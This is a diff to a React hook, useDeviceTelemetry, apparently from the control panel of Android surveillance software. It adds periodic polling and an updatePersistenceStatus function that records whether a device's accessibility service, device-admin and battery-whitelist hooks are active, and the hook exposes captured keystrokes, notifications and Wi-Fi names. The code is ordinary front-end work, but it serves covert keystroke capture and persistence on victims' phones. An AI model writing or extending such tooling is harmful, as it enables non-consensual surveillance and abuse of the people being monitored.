@@ -30,7 +30,10 @@ export function useDeviceTelemetry(deviceId: string) {
   const fetchConfig = useCallback(async () => {
     if (!deviceId) return;
     try {
-      const res = await fetch(`/api/devices/${deviceId}/telemetry-config`);
+      const res = await fetch(`/api/devices/${deviceId}/telemetry-config?_t=${Date.now()}`, {
+        cache: "no-store",
+        headers: { "Cache-Control": "no-cache" },
+      });
       if (res.ok) {
         const data = await res.json();
         setTelemetryConfig(data.telemetry_config || {});
@@ -101,12 +104,31 @@ export function useDeviceTelemetry(deviceId: string) {
 
   useEffect(() => {
     fetchConfig();
+    const iv = setInterval(fetchConfig, 10000);
+    return () => clearInterval(iv);
   }, [fetchConfig]);
+
+  const updatePersistenceStatus = useCallback(async (key: string, val: boolean) => {
+    if (!deviceId) return;
+    setPersistenceStatus((prev) => ({
+      ...prev,
+      [key === "is_accessibility_active" ? "isAccessibility" : key === "is_device_admin" ? "isAdmin" : "isBatteryWhitelisted"]: val,
+    }));
+    try {
+      await fetch(`/api/devices/${deviceId}/telemetry-config`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ [key]: val }),
+      });
+      fetchConfig();
+    } catch {}
+  }, [deviceId, fetchConfig]);
 
   return {
     telemetryConfig,
     setTelemetryConfig,
     persistenceStatus,
+    updatePersistenceStatus,
     currentSsid,
     notifications,
     keystrokes,
